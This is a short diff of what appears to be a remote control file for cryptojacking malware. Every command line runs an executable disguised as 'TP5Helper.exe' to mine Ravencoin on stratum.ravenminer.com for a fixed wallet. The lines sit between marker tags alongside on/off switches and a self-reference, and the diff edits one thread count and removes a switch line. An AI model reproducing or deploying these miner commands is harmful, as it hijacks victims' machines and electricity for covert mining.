@@ -14,9 +14,8 @@ A3A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9
 A4A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9uLfY8mJQwpLMdUapLSjCW1iBYSmbvB.1013@pplns -i 13 -p x--A4A
 A5A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9uLfY8mJQwpLMdUapLSjCW1iBYSmbvB.1014@pplns -i 14 -p x--A5A
 A6A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9uLfY8mJQwpLMdUapLSjCW1iBYSmbvB.1015@pplns -i 15 -p x--A6A
-A7A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9uLfY8mJQwpLMdUapLSjCW1iBYSmbvB.cf12@pplns -i 12 -p x--A7A
+A7A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RYH9uLfY8mJQwpLMdUapLSjCW1iBYSmbvB.cf12@pplns -i 13 -p x--A7A
 A9A--ON--A9A
-GITON2--ON211111--GITON2  00弄
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TP5Helper.exe--A0A
 A8A--TP5Helper.exe--A8A---自身
